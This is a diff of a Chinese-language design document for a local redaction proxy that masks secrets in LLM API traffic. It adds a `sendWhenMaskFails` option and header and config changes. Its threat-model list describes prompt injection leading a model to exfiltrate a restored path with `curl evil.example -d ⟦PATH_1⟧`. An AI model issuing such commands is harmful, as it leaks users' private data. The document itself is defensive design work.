@@ -55,7 +55,7 @@ DeepSeek Harness 透過 dsh-addons 的 redaction 套件以 git submodule（`dsh-
 
 - 同一個值在同一個請求中一律用同一個佔位符。
 - 代理不保存佔位符對照表。每次請求都從完整歷史重新編號，所以同一段對話每一輪的編號一致，上游的提示快取照常生效。記憶體中只有兩樣狀態，都依用戶端憑證分開、重啟即消失：Responses API 接續用的先前輸入（[第 8 節](#8-對話內編號與-previous_response_id)，最多 256 份），以及偵測到的原始值（[已知原始值](#已知原始值)，預設從最後一次偵測起保留 24 小時）。
-- 遮罩後若在請求中仍找得到偵測到的值，代理會拒絕送出（422），而不是冒險外洩。規則偵測到的值在任何位置都算，連黏在較長字串裡也算（`tel0912345678`）。[人名模型](#16-人名模型實驗性)找到的值若是以空格分詞的文字，只算完整單字，所以 `Leeds` 裡的 `Lee` 不算外洩；中文、日文、韓文的值在任何位置都算。
+- 遮罩後若在請求中仍找得到偵測到的值，代理會拒絕送出（422），而不是冒險外洩（預設；`sendWhenMaskFails` 見第 6 節）。規則偵測到的值在任何位置都算，連黏在較長字串裡也算（`tel0912345678`）。[人名模型](#16-人名模型實驗性)找到的值若是以空格分詞的文字，只算完整單字，所以 `Leeds` 裡的 `Lee` 不算外洩；中文、日文、韓文的值在任何位置都算。
 - 金鑰照常由用戶端送出，代理原樣轉送，從不儲存。
 
 一個請求的處理順序（`server.ts` 的 `forward`）：
@@ -67,12 +67,12 @@ flowchart TD
   C --> D{"screen 模式"}
   D -- "replace" --> E["控制字元與 ⟦ ⟧ 換成可見替代字元"]
   D -- "refuse" --> F{"含這類字元？"}
-  F -- "是" --> F2["回 422"]
+  F -- "是" --> F2["回 422（預設）"]
   F -- "否" --> G
   E --> G["加上 previous_response_id 對應的先前輸入"]
   G --> H["mask：偵測（含此憑證記住的值）、編號、擴散"]
   H --> I["序列化後搜尋每個原始值"]
-  I -- "仍找得到" --> J["回 422，指出欄位路徑"]
+  I -- "仍找得到" --> J["回 422（預設），指出欄位路徑"]
   I -- "乾淨" --> K["轉送上游，帶用戶端自己的標頭"]
   K --> L{"回應類型"}
   L -- "JSON" --> M["restoreDeep 整份還原"]
@@ -233,7 +233,7 @@ flowchart TD
 
 外洩檢查會在以下情況觸發：偵測到的值也出現在不遮的欄位（第 5 節），或該值出現在較長的詞中間而未被遮。只出現在不遮欄位或物件鍵中、別處沒有出現的值，不會被偵測，照原樣送出。拒絕訊息只指出欄位，絕不含值：陣列索引照寫（`/messages/1/content`）；本身含有偵測值的鍵，以及不是小寫識別字（`[a-z][a-z0-9_]*`，最多 40 字元）的鍵，都寫成 `<key>`。拒絕時請求不會送出。
 
-**`sendWhenMaskFails`。** 預設 `false`，上面兩種 422（外洩檢查、`RedactionError`）照常拒絕。設為 `true` 時，外洩檢查找到的請求改送出部分遮罩的本文（遮得到的地方照常是佔位符，殘留的值照原樣），`mask` 拋出 `RedactionError` 的請求改送出原始本文。這會把偵測到的值送給服務商。兩種情況都在回應加上 `x-redaction-proxy-mask-failed: 1` 標頭，並在日誌記一行警告，寫出欄位路徑與類別（與拒絕訊息相同），或 `RedactionError` 的錯誤代碼，絕不含值；這類請求即使開了 `debugMasked` 也不記錄本文。回覆照常以這個請求的綁定還原；`RedactionError` 時沒有綁定，佔位符照原樣回給用戶端。這個開關不影響其他拒絕：`screen: "refuse"`、未知的 `previous_response_id`、來源、權杖、`Host`、大小檢查與上游重新導向照常拒絕；`nameModel.required` 維持原意（為 `true` 時回 503，否則只以規則遮罩後送出）。
+**`sendWhenMaskFails`。** 預設 `false`，上面兩種 422（外洩檢查、`RedactionError`）照常拒絕。設為 `true` 時，外洩檢查找到的請求改送出部分遮罩的本文（遮得到的地方照常是佔位符，殘留的值照原樣），`mask` 拋出 `RedactionError` 的請求改送出原始本文。這會把偵測到的值送給服務商。兩種情況都在回應加上 `x-redaction-proxy-mask-failed: 1` 標頭（請求送出後代理自己回的錯誤也帶，例如上游重新導向時的 502），並在日誌記一行警告，寫出欄位路徑與類別（與拒絕訊息相同），或 `RedactionError` 的錯誤代碼，絕不含值；這類請求即使開了 `debugMasked` 也不記錄本文。回覆照常以這個請求的綁定還原；`RedactionError` 時沒有綁定，佔位符照原樣回給用戶端。這個開關不影響其他拒絕：`screen: "refuse"`、未知的 `previous_response_id`、來源、權杖、`Host`、大小檢查與上游重新導向照常拒絕；`nameModel.required` 維持原意（為 `true` 時回 503，否則只以規則遮罩後送出）。
 
 錯誤回應本文的格式：`{"error":{"type":"redaction_proxy_error","message":"..."}}`。
 
@@ -248,7 +248,7 @@ flowchart TD
 | `GET` 任何路徑 | 原樣轉送 | 帶 `x-api-key` 或 `anthropic-version` 標頭時走 Anthropic，否則走 OpenAI |
 | `OPTIONS`（CORS 預檢） | 允許的來源回 204，不轉送 | — |
 
-上游 URL 為設定的 base 加上用戶端的原始路徑與查詢字串。用戶端的 `authorization`、`x-api-key`、`anthropic-*` 等標頭原樣轉送，代理從不儲存。`host`、`connection`、`content-length`、`content-encoding`、`accept-encoding` 等逐跳標頭不轉送，送往上游時固定 `accept-encoding: identity`。`x-redaction-proxy-token` 不轉送。上游回應的 `access-control-*` 標頭不轉回；來自允許來源的請求，由代理自己回 `access-control-allow-origin: <該來源>`。用戶端斷線時，代理會中止上游請求。代理不跟隨上游的重新導向（回 502），所以用戶端的憑證與請求只送往設定的上游，即使 `Location` 指向別的主機或 `http://`。
+上游 URL 為設定的 base 加上用戶端的原始路徑與查詢字串。用戶端的 `authorization`、`x-api-key`、`anthropic-*` 等標頭原樣轉送，代理從不儲存。`host`、`connection`、`content-length`、`content-encoding`、`accept-encoding` 等逐跳標頭不轉送，送往上游時固定 `accept-encoding: identity`。`x-redaction-proxy-token` 不轉送。上游回應的 `access-control-*` 標頭不轉回；來自允許來源的請求，由代理自己回 `access-control-allow-origin: <該來源>` 與 `access-control-expose-headers: x-redaction-proxy-mask-failed`。上游回應若帶 `x-redaction-proxy-mask-failed`，代理把它去掉，這個標頭只由代理設定。用戶端斷線時，代理會中止上游請求。代理不跟隨上游的重新導向（回 502），所以用戶端的憑證與請求只送往設定的上游，即使 `Location` 指向別的主機或 `http://`。
 
 ## 7. 串流還原
 
@@ -342,12 +342,12 @@ URL 內的佔位符不論類別一律保持原樣；回覆文字（含 reasoning
 
 用戶端可能改寫歷史：壓縮成摘要，或丟掉較早的訊息。值若是靠上下文偵測到的（`password: Tr0ub4dor&3x` 的關鍵詞），先前回覆中還原出來的 `Tr0ub4dor&3x` 少了關鍵詞就不再被偵測，會原樣送上游。因此代理把每個請求偵測到的原始值與類別，依同一個用戶端範圍存在記憶體中，之後同一範圍的請求把它們加進同值擴散，在它們單獨出現的地方遮罩。保護分兩層：
 
-- **同一個請求內。** 這次偵測到的值不論多短都擴散到它的每個出現處，並受外洩檢查保護：遮罩後仍在請求中的寫法（黏著其他字元、大寫、在不改寫的欄位中）讓請求以 422 拒絕；名稱模型的值與 `terms`、`projectNames` 的字面值只算完整單字（第 6 節）。另一個偵測拆開某次出現時（`call pw-0912345678` 中的電話號碼），沒蓋到的部分（`pw-`）各自綁定並遮罩，但外洩檢查不看它，即使整個值是這個請求偵測到的：憑證的前段（`hunter2zz-`）單獨出現在 `metadata` 中時照原樣送出，整個值與其中偵測到的電話號碼照常檢查。記住的憑證的部分也不分 ASCII 大小寫（`PW-`）。
+- **同一個請求內。** 這次偵測到的值不論多短都擴散到它的每個出現處，並受外洩檢查保護：遮罩後仍在請求中的寫法（黏著其他字元、大寫、在不改寫的欄位中）讓請求預設以 422 拒絕；名稱模型的值與 `terms`、`projectNames` 的字面值只算完整單字（第 6 節）。另一個偵測拆開某次出現時（`call pw-0912345678` 中的電話號碼），沒蓋到的部分（`pw-`）各自綁定並遮罩，但外洩檢查不看它，即使整個值是這個請求偵測到的：憑證的前段（`hunter2zz-`）單獨出現在 `metadata` 中時照原樣送出，整個值與其中偵測到的電話號碼照常檢查。記住的憑證的部分也不分 ASCII 大小寫（`PW-`）。
 - **跨請求。** 記住的值只是盡力而為的額外遮罩，從不拒絕請求。它們以同值擴散比對：作為完整單字出現時遮（也找 JSON 跳脫寫法，憑證也找任何 ASCII 大小寫），黏在其他文字中（`xTr0ub4dor&3xy`、`footballer` 裡記住的 `football`）、換了寫法（大寫又經 JSON 跳脫的 `P@SS\\WORD12`），或在不改寫的欄位（`metadata`）中時照原樣送出。這樣記住的 `football` 不會讓之後含 `footballer` 的請求被拒。
 - **長度。** 同一個請求內，憑證（`KEY`）不論多短都擴散到它的每個出現處：`password: ab12x, again ab12x` 兩處都遮。帶到之後請求的，只有本身長度就夠擴散的值：至少 6 個可列印 ASCII 字元，或至少 2 個其他碼位。較短的值不記住，否則 `ab1` 會遮掉之後每個 `ab12` 裡的那段；所以之後的請求中，少了關鍵詞的 `ab12x` 照原樣送出。全由協定與佔位用字組成的 snake_case 值（`web_server`、`data_store`）也不記住，否則之後請求中提到這個欄位名的文字都會被遮；它們只在綁定它們的請求中遮。
 - **大小寫。** 記住的憑證不分 ASCII 大小寫：之後出現的 `TR0UB4DOR&3X`、`tr0ub4dor&3x` 都遮，各有自己的佔位符。其他類別照原樣比對。
 - **容量。** 每個範圍每個類別最多 4,096 個值、最多 64 個範圍，都先進先出；請求再綁定的值移到最新端。類別各自計數，所以一次幾千個 email 的工具結果擠不掉記住的憑證。在用戶端自己寫的文字（user、system、developer 訊息的內容與文字部分，以及 Anthropic 的 `system` 與 Responses 的 `instructions`）中綁定的值（包括只靠記憶遮到的值：工具輸出中偵測到、之後使用者不帶關鍵詞寫出的值，移進這個桶時存活時間不變）另外放在每個類別各一個桶中，也是 4,096 個，所以一次幾千行 cookie 的工具結果也擠不掉使用者訊息或系統提示中的密碼；使用者自己貼上的大量同類別新值（例如 4,096 個新的 `password: …`）則會擠掉較舊的憑證，之後它的回聲照原樣送出。記憶依用戶端憑證分開且有上限，所以連得到代理的本機程式可以送大量請求（或用 64 個不同的憑證）把記住的值擠掉；這可以接受，因為代理預設只綁定本機位址，綁定其他位址時必須設 `authToken`（第 11 節）。
-- **外洩檢查。** 列舉欄位（`type`、`role`、`object`、`status`、`finish_reason`、`stop_reason`、`service_tier`、`reasoning_effort`、`tool_choice`）的字串只能是 API 定義的固定值，不帶私人資料；值像列舉值（小寫英文字母開頭，只含小寫英數字與 `_`、`.`、`:`、`-`，最多 64 字元）時外洩檢查不看。否則一個被誤判的 `assistant`，會讓帶 assistant 回合的請求被拒。`metadata`、`stop` 底下與工具呼叫輸入中的鍵由用戶端或工具定義，那裡同名的鍵照常檢查；工具呼叫輸入不論鍵名都遮（第 5 節），所以還原進名為 `type`、`status`、`name` 等工具參數的值，回送時會再被遮罩。物件鍵照常檢查：被誤判的 `messages`、`text` 會讓含這些鍵的請求以 422 拒絕。拒絕訊息寫出每個欄位所含值的類別，從不寫值本身。
+- **外洩檢查。** 列舉欄位（`type`、`role`、`object`、`status`、`finish_reason`、`stop_reason`、`service_tier`、`reasoning_effort`、`tool_choice`）的字串只能是 API 定義的固定值，不帶私人資料；值像列舉值（小寫英文字母開頭，只含小寫英數字與 `_`、`.`、`:`、`-`，最多 64 字元）時外洩檢查不看。否則一個被誤判的 `assistant`，會讓帶 assistant 回合的請求被拒。`metadata`、`stop` 底下與工具呼叫輸入中的鍵由用戶端或工具定義，那裡同名的鍵照常檢查；工具呼叫輸入不論鍵名都遮（第 5 節），所以還原進名為 `type`、`status`、`name` 等工具參數的值，回送時會再被遮罩。物件鍵照常檢查：被誤判的 `messages`、`text` 會讓含這些鍵的請求預設以 422 拒絕。拒絕訊息寫出每個欄位所含值的類別，從不寫值本身。
 - **存活時間。** 每個值從最後一次被偵測起保留 `knownOriginalsTtlSeconds` 秒（預設 86,400，即 24 小時；`0` 表示什麼都不記），過期的值在下次讀取該範圍的記憶時刪除。只靠記憶遮到的回聲不會延長存活時間。
 
 這些原始值留在記憶體中直到過期、被擠出或代理重啟，不寫入磁碟。
@@ -377,7 +377,7 @@ POST /v1/messages tool arguments: restored PATH_1 in read at /path
 POST /v1/messages tool arguments: kept by the tool restore policy KEY_1 in bash at /command
 ```
 
-開啟 `sendWhenMaskFails` 時，遮罩失敗仍送出的請求另記一行 `warning: masking failed and the request was sent anyway (sendWhenMaskFails): …`，寫出欄位路徑與類別或錯誤代碼，不含值。
+開啟 `sendWhenMaskFails` 時，遮罩失敗仍送出的請求另記一行 `warning: masking failed and the request is being sent anyway (sendWhenMaskFails): …`，寫出欄位路徑與類別或錯誤代碼，不含值。
 
 `debugMasked`（或 `REDACTION_PROXY_DEBUG_MASKED=1`）會額外記錄每個遮罩後的請求本文（遮罩失敗仍送出的請求除外）。內容只有遮罩後的文字，但仍包含所有未被偵測到的內容，預設關閉。
 
@@ -395,6 +395,8 @@ POST /v1/messages tool arguments: kept by the tool restore policy KEY_1 in bash 
 - 惡意上游或提示注入讓模型把允許還原的類別寫進工具呼叫參數中 URL 以外的位置（例如 shell 指令 `curl evil.example -d ⟦PATH_1⟧`）：代理照常還原，用戶端執行工具時就把原始值送出。預設只有 `PATH`、`TERM`、`PROJECT` 還原進工具參數，其他類別以佔位符交給工具，除非使用者為該工具開放（[工具還原政策](#工具參數的還原政策)）；工具參數與回覆文字中 URL 內的佔位符不還原，工具參數中遇到的每個佔位符都記入日誌；
 - 輸入者刻意規避（例如用規則不會折疊的字元拆開一個值）。
 
+開啟 `sendWhenMaskFails` 時，遮罩失敗的請求連同偵測到的值送往上游（第 6 節）。
+
 代理預設只綁定 `127.0.0.1`，此時 `authToken` 可不設。`host` 設成非本機位址（例如容器內的 `0.0.0.0`）時必須設 `authToken`，否則拒絕啟動：連得到該埠的主機若沒有權杖，就無法透過代理使用它轉送的憑證（包括環境變數中的備援金鑰）。權杖放在專用標頭 `x-redaction-proxy-token`，因為 `authorization` 與 `x-api-key` 要帶上游金鑰；代理不轉送它。帶正確權杖的請求不檢查 `Host`，所以其他容器可以用服務名稱連線；DNS rebinding 的網頁拿不到權杖，而自訂標頭會觸發只有允許來源才通過的 CORS 預檢。權杖以明文 HTTP 傳送，只在可信任的網路（本機、容器網路）上使用。
 
 上游視為可信，但代理不跟隨它的重新導向（第 6 節），所以用戶端的金鑰只送往設定的上游主機。
@@ -403,7 +405,7 @@ POST /v1/messages tool arguments: kept by the tool restore policy KEY_1 in bash 
 
 ## 12. 完整設定
 
-以 `--config 路徑`（`-c`）或 `REDACTION_PROXY_CONFIG` 指定設定檔，環境變數覆寫檔案。設定檔可以是 TOML（`.toml`）或 JSON（`.json`），依副檔名判斷，其他副檔名會讓啟動失敗；兩種格式的鍵名與巢狀結構相同（TOML 的 `[toolRestore]` 表或 `toolRestore.categories` 點號鍵，對應 JSON 的 `"toolRestore": {…}`），驗證也相同。語法錯誤會讓啟動失敗，訊息只寫檔案路徑（TOML 另寫行號與欄號）與錯誤種類，不引用檔案內容。不認得的鍵會讓啟動失敗；鍵名含 key 或 secret 時，錯誤訊息會提醒上游 API 金鑰應放環境變數。[config.example.toml](../config.example.toml) 列出每個選項、說明與預設值。
+以 `--config 路徑`（`-c`）或 `REDACTION_PROXY_CONFIG` 指定設定檔，環境變數覆寫檔案。設定檔可以是 TOML（`.toml`）或 JSON（`.json`），依副檔名判斷；沒有副檔名的路徑（例如 `/dev/stdin`）讀成 JSON，其他副檔名會讓啟動失敗；兩種格式的鍵名與巢狀結構相同（TOML 的 `[toolRestore]` 表或 `toolRestore.categories` 點號鍵，對應 JSON 的 `"toolRestore": {…}`），驗證也相同。語法錯誤會讓啟動失敗，訊息只寫檔案路徑（TOML 另寫行號與欄號）與錯誤種類，不引用檔案內容。不認得的鍵、型別不對的值（布林設定寫成 `"true"`；`redaction`、`toolRestore`、`nameModel` 不是表，例如 TOML 日期或數字）會讓啟動失敗；鍵名含 key 或 secret 時，錯誤訊息會提醒上游 API 金鑰應放環境變數。錯誤訊息只在鍵或值是簡短識別字（英文字母開頭、最多 32 個英數字、`_`、`-`，且不以 `sk-` 開頭）時才引用它，否則寫成 `<key>`、`<value>` 或型別（`<number>`），所以誤貼進檔案的權杖不會被印出。[config.example.toml](../config.example.toml) 列出每個選項、說明與預設值。
 
 ```json
 {
@@ -434,9 +436,9 @@ POST /v1/messages tool arguments: kept by the tool restore policy KEY_1 in bash 
 | `allowedOrigins` | `REDACTION_PROXY_ALLOWED_ORIGINS`（逗號分隔） | 無 | 本機 `http(s)` 來源之外允許的瀏覽器來源，與 `Origin` 標頭逐字比較（不分大小寫，去掉結尾斜線），例如 `app://my-client`。拒絕 `null` 與 `*`。 |
 | `openaiUpstream` | `REDACTION_PROXY_OPENAI_UPSTREAM` | `https://api.openai.com` | Chat Completions、Responses 與 OpenAI 型 GET 的上游 base，必須是 http(s)。 |
 | `anthropicUpstream` | `REDACTION_PROXY_ANTHROPIC_UPSTREAM` | `https://api.anthropic.com` | Messages 與 Anthropic 型 GET 的上游 base。 |
-| `allowInsecureUpstream` | `REDACTION_PROXY_ALLOW_INSECURE_UPSTREAM=1` | `false` | 允許以明文 `http://` 連到非本機的上游。未設定時這種上游會讓啟動失敗，因為 API 金鑰會以明文傳送。 |
+| `allowInsecureUpstream` | `REDACTION_PROXY_ALLOW_INSECURE_UPSTREAM=1` | `false` | 允許以明文 `http://` 連到非本機的上游。未設定時這種上游會讓啟動失敗，因為 API 金鑰會以明文傳送。檔案中只接受布林值。 |
 | `screen` | `REDACTION_PROXY_SCREEN` | `replace` | `replace` 或 `refuse`，見第 9 節。 |
-| `debugMasked` | `REDACTION_PROXY_DEBUG_MASKED=1` | `false` | 記錄遮罩後的請求本文。 |
+| `debugMasked` | `REDACTION_PROXY_DEBUG_MASKED=1` | `false` | 記錄遮罩後的請求本文。檔案中只接受布林值。 |
 | `sendWhenMaskFails` | `REDACTION_PROXY_SEND_WHEN_MASK_FAILS`（`1` 或 `0`） | `false` | 遮罩失敗時仍送出請求，不以 422 拒絕：外洩檢查找到殘留值時送出部分遮罩的本文，`mask` 拋出 `RedactionError` 時送出原始本文。這會把偵測到的值送給服務商。回應帶 `x-redaction-proxy-mask-failed: 1` 標頭，日誌記一行不含值的警告。檔案中只接受布林值，環境變數只接受 `1` 或 `0`，環境變數覆寫檔案。見[第 6 節](#6-拒絕與錯誤狀態碼)。 |
 | `knownOriginalsTtlSeconds` | `REDACTION_PROXY_KNOWN_ORIGINALS_TTL_SECONDS` | `86400` | 偵測到的值為之後的請求保留的秒數，從最後一次偵測起算；`0` 表示不記住。見[第 8 節](#已知原始值)。 |
 | `toolRestore.categories` | `REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（逗號分隔） | `PATH`、`TERM`、`PROJECT` | 還原進工具呼叫參數的類別，或 `"*"`（全部）；空字串代表都不還原。見[第 7 節](#工具參數的還原政策)。 |
@@ -503,7 +505,7 @@ POST /v1/messages tool arguments: kept by the tool restore policy KEY_1 in bash 
 
 - 對真實 OpenAI、Anthropic API 與真實用戶端（Claude Code、OpenAI SDK）做端對端驗證。
 - 量測中文散文語料的誤遮率。
-- 發布到 npm。套件已可發布（`bin` 入口 `redaction-proxy`，`npm pack` 只含 `lib/`、README、LICENSE、NOTICE），但 `package.json` 仍是 `"private": true`；決定發布時刪掉這一行即可（若改用 scoped 名稱，另加 `"publishConfig": { "access": "public" }`）。`prepublishOnly` 會先跑型別檢查與測試。授權條款已定為 Apache-2.0（[LICENSE](../LICENSE)）。
+- 發布到 npm。套件已可發布（`bin` 入口 `redaction-proxy`，`npm pack` 只含 `lib/`、README、LICENSE、NOTICE、`config.example.toml`），但 `package.json` 仍是 `"private": true`；決定發布時刪掉這一行即可（若改用 scoped 名稱，另加 `"publishConfig": { "access": "public" }`）。`prepublishOnly` 會先跑型別檢查與測試。授權條款已定為 Apache-2.0（[LICENSE](../LICENSE)）。
 - 實際建置並執行 Docker 映像（`Dockerfile` 已寫好，尚未在有 Docker 的環境建置）。映像綁定 `0.0.0.0`，所以必須以 `-e REDACTION_PROXY_AUTH_TOKEN` 傳入權杖，並以 `-p 127.0.0.1:8787:8787` 只發布到本機。
 - 將 dsh-privacy-router 的串流還原器統一到這份核心。
 
@@ -568,7 +570,7 @@ node scripts/fetch-name-model.mjs ~/models/nym       # 從 Hugging Face 下載�
 | --- | --- |
 | 藏實體，不藏語意 | 上游仍讀得到佔位符周圍的一切。`⟦PATH_1⟧/clients/acme-layoffs.md` 依然透露很多。 |
 | 人名、地址只有列出才遮 | 預設沒有自由文字的人名偵測，也沒有地址規則：地址是自由文字，沒有固定格式、檢查碼或關鍵詞，規則無法和一般句子區分。人名、公司名、代號要列進 `terms` 或 `projectNames`，或開啟[實驗性的人名模型](#16-人名模型實驗性)，但它會漏掉一些人名。病況、薪資照原樣送出。 |
-| 有些欄位不遮 | 圖片、PDF 等 base64 檔案（純文字文件的內容照常遮罩）、音訊、`metadata`、工具名稱、帶簽章的 thinking 原樣轉送且不掃描，JSON 物件的鍵也是。在被遮文字中偵測到的值若也出現在這些欄位，整個請求以 422 拒絕；只出現在這些欄位的值照原樣送出。回送的工具呼叫輸入不論鍵名都遮（第 5 節）。 |
+| 有些欄位不遮 | 圖片、PDF 等 base64 檔案（純文字文件的內容照常遮罩）、音訊、`metadata`、工具名稱、帶簽章的 thinking 原樣轉送且不掃描，JSON 物件的鍵也是。在被遮文字中偵測到的值若也出現在這些欄位，整個請求預設以 422 拒絕；只出現在這些欄位的值照原樣送出。回送的工具呼叫輸入不論鍵名都遮（第 5 節）。 |
 | Cursor 不能用 | Cursor 的自訂 base URL 請求是從 Cursor 自己的伺服器發出，連不到你的 `127.0.0.1`；而且 Cursor 後端在任何代理之前就看到未遮罩的提示。 |
 | 有些拆開的寫法抓不到 | 偵測不到：點後加空格的私有 IP（`192. 168. 1. 2`）；被空格或換行拆開的 API 金鑰（高熵規則只抓得到部分片段）；寫成 `name @ domain`（`@` 兩側有空白，`wang.yichun @ example.tw`）或單獨用 ` at `（`wang.yichun at example.tw`）的 email 不遮，因為 shell 提示字元（`root @ web01.example.com`）、帳號標記（`cc @ alice.me`）、英文散文（`socket.io at github.com`）與矩陣程式碼（`a.b @ c.de`）長得一樣；這類 email 只有隱私分類器把關。抓得到：加了空格或連字號的 terms、`＠`、`(at)`、`[at]`、`[dot]`，以及中間有一個分隔符的身分證字號、統編、手機號碼；啟用延伸規則時（代理預設）也抓得到小寫字母開頭或夾不換行空白的身分證字號，以及以 `.`、`/`、`_` 分組或前 4 碼加括號的手機號碼。仍偵測不到：一般空白或連字號在其他位置的身分證字號（`A12345-6789`），以及小寫字母開頭又有一般空白或連字號的寫法（`a 123456789`）；沒有關鍵詞的護照與健保卡號（沒有檢查碼），以及以空白分組的護照號碼（`passport 312 345 678`）；`jwt=X` 中不是 JWT 形狀的值（`key = X` 指派由 `api-key` 讀，`jwt` 不在它的關鍵詞中；JWT 形狀的值本來就由 `api-key`、`token-format` 遮）。 |
 | 有些編碼寫法抓不到 | 百分比編碼（percent-encoding）的值（`lin.yating%40example.com`、查詢字串裡的 `%E6%98%9F…`、`%2FUsers%2F…`）會解碼一層後偵測，遮罩範圍是編碼原文，回覆還原時寫回編碼原文。夾雜無效或截斷的位元組（`%FF`、在 `%E6` 處被截斷的 URL）不會讓其餘部分不解碼，解碼後的全形字元與零寬字元也和一般文字一樣折疊，緊接在無效位元組後面的號碼或金鑰（`%E6%2B886…`、`%E609-1234-5678`、`%FFsk-…`）也抓得到。啟用 `email-escaped` 時（代理預設），`@` 寫成 `&#64;`、`&#x40;`、`&commat;`、`\u0040` 的 email 也抓得到。偵測不到：編碼兩次的值（`%2540`）；表單編碼查詢中代表空格的 `+`（`星河+計畫`）；URL 裡經 base64 編碼的值（隱私路由只在工具輸出中解碼 base64）；緊接在無效位元組後面的身分證字號（`%E6A123456789`），因為 Big5 與 Shift-JIS 中緊接在前導位元組後面的字母是該字的一部分（`%A4A` 是「乙」）。同理，尾位元組為 `A` 的 Shift-JIS 字元可能讓 `%83AKIA…` 被遮成形似金鑰的範圍。 |
